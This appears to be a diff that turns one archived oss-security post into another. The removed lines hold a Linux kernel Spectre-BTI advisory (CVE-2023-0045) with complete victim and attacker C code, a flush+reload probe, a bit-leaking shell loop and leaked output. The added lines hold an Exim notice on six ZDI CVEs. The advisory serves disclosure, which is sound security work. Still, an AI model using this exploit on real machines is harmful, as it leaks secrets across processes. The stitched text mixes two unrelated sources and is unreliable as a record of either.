@@ -1,306 +1,106 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/02/03/1
-Message-ID: <CAFXgH+NM7C5r0sVf52ZvO+=vP5sC6=BPBO2paJQN19H5KZcB_Q@mail.gmail.com>
-Date: Fri, 3 Feb 2023 13:11:01 -0500
-From: Rafael Correa De Ysasi <rcorreadeysasi@...omium.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/10/01/4
+Message-ID: <ZRmjAky/SBs4aCIw@jumper.schlittermann.de>
+Date: Sun, 1 Oct 2023 18:49:06 +0200
+From: Heiko Schlittermann <hs@...marc.schlittermann.de>
 To: oss-security@...ts.openwall.com
-Cc: 3pvd@...gle.com
-Subject: CVE-2023-0045: Linux Kernel: Bypassing Spectre-BTI User Space Mitigations
+Subject: Re: Exim4 MTA CVEs assigned from ZDI
 Content-Type: text/plain; charset=utf-8
 
+Dear Exim users,
+
+thank you for your patience.  The following tries to provide an abstract
+about the topics that arose during the recent hours.
+
 Summary
+-------
+Six 0day exploits were filed against Exim.
 
-The Linux kernel does not correctly mitigate SMT attacks, as discovered
-through a strange pattern in the kernel API using STIBP as a mitigation[1
-<https://docs.kernel.org/userspace-api/spec_ctrl.html>], leaving the
-process exposed for a short period of time after a syscall. The kernel also
-does not issue an IBPB immediately during the syscall.
-The ib_prctl_set [2
-<https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/cpu/bugs.c#L1467>]function
-updates the Thread Information Flags (TIFs) for the task and updates the
-SPEC_CTRL MSR on the function __speculation_ctrl_update [3
-<https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/process.c#L557>],
-but the IBPB is only issued on the next schedule, when the TIF bits are
-checked. This leaves the victim vulnerable to values already injected on
-the BTB, prior to the prctl syscall.
-The behavior is only corrected after a reschedule of the task happens.
-Furthermore, the kernel entrance (due to the syscall itself), does not
-issue an IBPB in the default scenarios (i.e., when the kernel protects
-itself via retpoline or eIBRS).
-Severity
+None of these issues is related to transport security (TLS) being
+on or off.
 
-High - The inability to correctly mitigate SMT attacks, leaves the kernel
-exposed for an attacker to inject malicious code into the running kernel,
-which could lead to a complete compromise of the system.
-Proof of Concept
+* 3 of them are related to SPA/NTLM, and EXTERNAL auth. If you do not use
+  SPA/NTLM, or EXTERNAL authentication, you're not affected.
+  These issues are fixed.
 
-To ensure this wasn't a measurement error, we created a simple POC. The
-victim code always executes asafe_function through a function pointer that
-is vulnerable to a spectre-BTI attack. The victim requests the kernel for
-protection using the prctl syscall (inside protect_me). The victim also
-loads a secret from a text file, showing that other syscalls don’t check
-the TIF bit or provoke a reschedule that would force an IBPB.
+* One issue is related to data received from a proxy-protocol proxy. If
+  you do not use a proxy in front of Exim, you're not affected. If your
+  proxy is trustworthy, you're not affected. We're working on a fix.
 
-//gcc -o victim victim.c -O0 -masm=intel -no-pie -fno-stack-protector
-#include "common.h"
+* One is related to libspf2. If you do not use the `spf` lookup type
+  or the `spf` ACL condition, you are not affected.
 
-int main(int argc, char *argv[])
-{
+* The last one is related to DNS lookups. If you use a trustworthy
+  resolver (which does validation of the data it receives), you're
+  not affected. We're working on a fix.
 
-    setvbuf(stdout, NULL, _IONBF, 0);
-    printf("running victim %s\n", argv[1]);
+Schedule
+--------
+Currently we're in contact with the major distros and aim to release
+those fixes that are available as soon as possible. (Aiming Monday, Oct
+2nd.) The below mentioned commits are currently available in a
+protected repo to a restricted set of users only.
 
-    //only call safe_function
-    codePtr = safe_function;
-    char secret[20];
-    char *sharedmem = open_shared_mem();
-    unsigned idx = string_to_unsigned(argv[1]);
+More Details
+------------
 
-    //call for prctl to protect this process
-    protect_me();
+ZDI-23-1468 | ZDI-CAN-17433 | CVE-2023-42114 | Exim bug 3001
+------------------------------------------------------------
+Subject:    NTLM Challenge Out-Of-Bounds Read
+CVSS Score: 3.7
+Mitigation: Do not use SPA (NTLM) authentication
+Subsystem:  SPA auth
+Fixed:      04107e98d, 4.96.1, 4.97
 
-    //only then load the secret into memory
-    load_secret(secret);
+ZDI-23-1469 | ZDI-CAN-17434 | CVE-2023-42115 | Exim bug 2999
+------------------------------------------------------------
+Subject:    AUTH Out-Of-Bounds Write
+CVSS Score: 9.8
+Mitigation: Do not offer EXTERNAL authentication.
+Subsystem:  EXTERNAL auth
+Fixed:      7bb5bc2c6, 4.96.1, 4.97
 
-    for (int i = 0; i < 100; i++)
-    {
-        flush((char *)&codePtr);
-        //this arguments are never used on safe_function, but they
-match the signature of spectre_gadget, that should never be called
-        //Since prctl is called, it shouldn't be possible for an
-attacker to poison the BTB and leak the secret
-        spec(&sharedmem[2000], secret, idx);
-    }
-}
+ZDI-23-1470 | ZDI-CAN-17515 | CVE-2023-42116 | Exim bug 3000
+------------------------------------------------------------
+Subject:    SMTP Challenge Stack-based Buffer Overflow
+CVSS Score: 8.1
+Mitigation: Do not use SPA (NTLM) authentication
+Subsystem:  SPA auth
+Fixed:      e17b8b0f1, 4.96.1, 4.97
 
-Most of the libc functions were placed inside a common header between the
-attacker and the victim, so the spectre_gadget and spec functions share the
-same memory addresses on both victim and attacker (otherwise a .GOT entry
-is created and the addresses are changed). This is not a requirement and
-there are other ways to place the branches on the same addresses and mimic
-the victim context, but this method is the simplest.
+ZDI-23-1471 | ZDI-CAN-17554 | CVE-2023-42117 | Exim Bug 3031
+-------------------------------------------------------------
+Subject:    Improper Neutralization of Special Elements
+CVSS Score: 8.1
+Mitigation: Do not use Exim behind an untrusted proxy-protocol proxy
+Subsystem:  proxy protocol (not socks!)
+Fix:        not yet
 
-#include <stdlib.h>
-#include <sys/mman.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <stdio.h>
-#include <sys/prctl.h>
+ZDI-23-1472 | ZDI-CAN-17578 | CVE-2023-42118 | Exim Bug 3032
+------------------------------------------------------------
+Subject:    libspf2 Integer Underflow
+CVSS Score: 7.5
+Mitigation: Do not use the `spf` condition in your ACL
+Subsystem:  spf
+Remark:     It is debatable if this should be filed against
+            libspf2.
 
-char unused[0x1000];
-void (*codePtr)(char *, char *, unsigned idx);
-char unused2[0x1000];
+ZDI-23-1473 | ZDI-CAN-17643 | CVE-2023-42219 | Exim Bug 3033
+------------------------------------------------------------
+Subject:    dnsdb Out-Of-Bounds Read
+CVSS Score: 3.1
+Mitigation: Use a trustworthy DNS resolver which is able to
+            validate the data according to the DNS record types.
+Subsystem:  dns lookups
+Fix:        not yet
+Remark:     It is still under consideration.
 
-// this function does nothing. Always called by the victim
-void safe_function(char *a, char *b, unsigned idx)
-{
-}
+    Best regards from Dresden/Germany
+    Viele Grüße aus Dresden
+    Heiko Schlittermann
+--
+ SCHLITTERMANN.de ---------------------------- internet & unix support -
+ Heiko Schlittermann, Dipl.-Ing. (TU) - {fon,fax}: +49.351.802998{1,3} -
+ gnupg encrypted messages are welcome --------------- key ID: F69376CE -
 
-// this function is never called by the victim
-void spectre_gadget(char *addr, char *secret, unsigned idx)
-{
-    volatile char d;
-    if ((secret[idx / 8] >> (idx % 8)) & 1)
-        d = *addr;
-}
-
-// helper for better results probably not necessary but makes the tests easier
-void flush(char *adrs)
-{
-    asm volatile(
-        "clflush [%0]                   \n"
-        :
-        : "c"(adrs)
-        :);
-}
-
-// This function is vulnerable to a spectre-BTI attack.
-void spec(char *addr, char *secret, unsigned idx)
-{
-
-    for (register int i = 0; i < 30; i++)
-        ;
-    codePtr(addr, secret, idx);
-}
-
-// opens file as read only in memory to be used as side channel, but
-could be any other COW file like libc for example
-char *open_shared_mem()
-{
-    int fd = open("sharedmem", O_RDONLY);
-    char *res = (char *)mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0);
-    // ensure page is on memory
-    volatile char d = res[2100];
-    return res;
-}
-
-// load secret from file
-void load_secret(char *secret)
-{
-    FILE *fp = fopen("secret.txt", "r");
-    fgets(secret, 20, (FILE *)fp);
-}
-
-// Calls prctl to protect the user against spectre-BTI attacks -
-https://docs.kernel.org/userspace-api/spec_ctrl.html
-void protect_me()
-{
-    usleep(1000); //not needed but resets the available time on scheduler
-    prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH,
-PR_SPEC_FORCE_DISABLE, 0, 0);
-}
-
-// Utility. All utility functions are placed on common so the spec
-function matches the same address on both victim and attacker. This is
-not necessary but makes the tests easier
-unsigned string_to_unsigned(char *s)
-{
-    return atoi(s);
-}
-
-
-The attack consists in poisoning the BTB by calling the spec function and
-making it branch to spectre_gadget instead of safe_function. After the
-training the victim process is created and it executes spec that
-mispredicts to spectre_gadget which should never be executed. The secret is
-leaked through a classic flush+reload side channel.
-
-//gcc -o attacker attacker.c -O0 -masm=intel -no-pie -fno-stack-protector
-#include "common.h"
-
-#define PRINTNUM 1000
-
-unsigned probe(char *adrs)
-{
-    volatile unsigned long time;
-    asm __volatile__(
-        "    mfence             \n"
-        "    lfence             \n"
-        "    rdtsc              \n"
-        "    lfence             \n"
-        "    mov esi, eax       \n"
-        "    mov eax,[%1]       \n"
-        "    lfence             \n"
-        "    rdtsc              \n"
-        "    sub eax, esi       \n"
-        "    clflush [%1]       \n"
-        "    mfence             \n"
-        "    lfence             \n"
-        : "=a"(time)
-        : "c"(adrs)
-        : "%esi", "%edx");
-    return time;
-}
-
-int main(int argc, char *argv[])
-{
-
-    //Make spec function confuse safe_function with spectre_gadget
-    codePtr = spectre_gadget;
-
-    char dummy;
-    int hits = 0;
-    int tries = 0;
-    char *sharedmem = open_shared_mem();
-    setvbuf(stdout, NULL, _IONBF, 0);
-
-    while (1)
-    {
-        //Inject the target in the BTB
-        spec(&dummy, &dummy, 0);
-
-        //Allow for victim to execute and misspredict to spectre_gadget
-        usleep(1);
-
-        //probe the 1-bit flush+reload side channel
-        if (probe((char *)&sharedmem[2000]) < 0x90)
-        {
-            printf("+");
-        }
-    }
-}
-
-Since the victim receives an argument that can be used to choose the bit to
-be leaked through the side channel, we can execute the victim process
-multiple times while the attacker is executing:
-
-taskset -c 0 ./attacker >> result.txt &
-
-for i in {0..144}
-do
-    echo "Leaking bit $i... "
-    echo -e -n "Leaking bit $i: " >> result.txt
-    sleep .01
-    for j in {0..10}
-    do
-        taskset -c 0 ./victim $i >/dev/null
-    done
-
-    echo "" >> result.txt
-done
-
-python3 parseResult.py
-
-make clean
-echo -e "killing attacker"
-kill -9 $(pidof attacker)
-
-This leaves the following text file:
-
-Leaking bit 0: +++++++++++
-Leaking bit 1:
-Leaking bit 2:
-Leaking bit 3:
-Leaking bit 4:
-Leaking bit 5:
-Leaking bit 6: ++++++++++
-Leaking bit 7:
-Leaking bit 8: ++++++++
-[...]
-
-Note that bit 0 and 6 are 1, therefore the first character must be 0x41(A).
-Parsing the file with a simple Python script shows:The secret leaked is:
-b'Asuper_secret_flag' which is the exact content present in secret.txt used
-by the victim.
-Changing the prctl call for seccomp to
-syscall(SYS_seccomp,SECCOMP_SET_MODE_STRICT,0,0); after loading the secret
-doesn't prevent the attack. This is expected since internally both use the
-same ib_prctl_set function to implement the mitigation.
-Further Analysis
-
-The current implementation of the prctl syscall for speculative control
-fails to protect the user against attackers executing before the
-mitigation. The seccomp mitigation also fails in this scenario.
-The patch that added support for the conditional mitigation via prctl
-(ib_prctl_set) dates back to the kernel 4.9.176. It appears to have been
-introduced on Nov 28, 2018 in the following commit: torvalds/linux@...7bb2
-<https://github.com/torvalds/linux/commit/9137bb27e60e554dab694eafa4cca241fa3a694f>
-and
-the current __speculation_ctrl_update code that sets the MSRs, but without
-the immediate IBPB, was added on the same day in the following commit:
-torvalds/linux@...af56
-<https://github.com/torvalds/linux/commit/01daf56875ee0cd50ed496a09b20eb369b45dfa5>.
-This indicates that the issue has been present in the kernel for about 4
-years.
-Mitigations
-
-For user-mode applications, a usleep after the prctl call is enough to
-force a reschedule and ensure the correct mitigation. One possible kernel
-patch for this attack is to issue the IBPB just after the STIBP is set, on
-__speculation_ctrl_update [3
-<https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/process.c#L557>]
-or to call schedule(). After discussing with the Linux Kernel Security
-Team, that is what was decided, and the following commit has the fix:
-https://git.kernel.org/pub/scm/linux/kernel/git/tip/tip.git/commit/?id=a664ec9158eeddd75121d39c9a0758016097fa96
-.
-Patch
-
-This was addressed in the following [commit].(
-https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/arch/x86/kernel/cpu/bugs.c?h=v6.1.9&id=e8377f0456fb6738a4668d4df16c13d7599925fd
-)
-Timeline
-
-*Date reported*: 12/30/2022
-*Date fixed*: 01/04/2023
-*Date disclosed*: 02/03/2023
-
+Download attachment "signature.asc" of type "application/pgp-signature" (489 bytes)
